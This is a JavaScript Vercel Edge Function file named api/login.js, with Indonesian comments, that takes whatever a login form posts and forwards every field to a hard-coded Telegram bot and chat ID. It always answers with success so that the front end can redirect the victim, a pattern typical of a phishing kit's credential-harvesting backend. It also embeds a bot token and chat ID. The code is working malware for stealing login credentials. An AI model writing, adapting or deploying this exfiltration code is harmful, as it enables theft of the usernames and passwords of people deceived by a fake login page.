// api/login.js

const TELEGRAM_BOT_TOKEN = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
const CHAT_ID = "6604182176";

// Ini adalah fungsi handler untuk Vercel Edge Function
export default async function handler(request) {

    // --- 1. VALIDASI METHOD ---
    if (request.method !== 'POST') {
        // Edge Function merespon dengan Response object standar
        return new Response(JSON.stringify({ message: 'Method Not Allowed' }), {
            status: 405,
            headers: { 'Content-Type': 'application/json' },
        });
    }

    try {
        // Mendapatkan data JSON dari body request
        const data = await request.json(); 

        // --- 2. FORMAT PESAN ---
        let messageText = '🚨 EDGE FUNCTION LOGIN RECEIVED 🚨\n\n';
        for (const key in data) {
            if (data.hasOwnProperty(key)) {
                messageText += `*${key.toUpperCase().replace(/_|\s/g, ' ')}*: ${data[key]}\n`;
            }
        }
        
        // --- 3. KIRIM KE TELEGRAM ---
        const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await fetch(telegramURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            }),
        });

        // --- 4. RESPON KE KLIEN (SUCCESS 200) ---
        return new Response(JSON.stringify({ status: 'success', message: 'Data processed by Edge Function.' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' },
        });

    } catch (error) {
        // Jika ada kesalahan parsing atau pengiriman Telegram, tetap kirim 200
        // agar frontend bisa melanjutkan redirect.
        return new Response(JSON.stringify({ status: 'warning', message: 'Processing error, but redirecting.' }), {
            status: 200, 
            headers: { 'Content-Type': 'application/json' },
        });
    }
}

// Konfigurasi Edge Runtime
export const config = {
    runtime: 'edge',
};
